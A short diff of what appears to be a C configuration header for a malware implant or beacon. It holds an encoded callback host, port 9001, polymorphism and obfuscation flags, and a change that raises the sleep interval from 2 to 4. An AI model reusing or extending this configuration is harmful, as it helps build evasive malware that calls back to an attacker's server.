@@ -3,7 +3,7 @@
 #define CONFIG_HOST {0xa2, 0xa7, 0x23, 0x2c, 0xa2, 0xa0, 0xa6, 0x2c, 0xa2, 0x2c, 0xa3, 0x21, 0x22, 0xbb}
 #define CONFIG_PORT 9001
 #define CONFIG_SECURE FALSE
-#define CONFIG_SLEEP 2
+#define CONFIG_SLEEP 4
 #define CONFIG_POLYMORPHIC TRUE
 #define CONFIG_OBFUSCATION TRUE
 #define CONFIG_ARCH 64
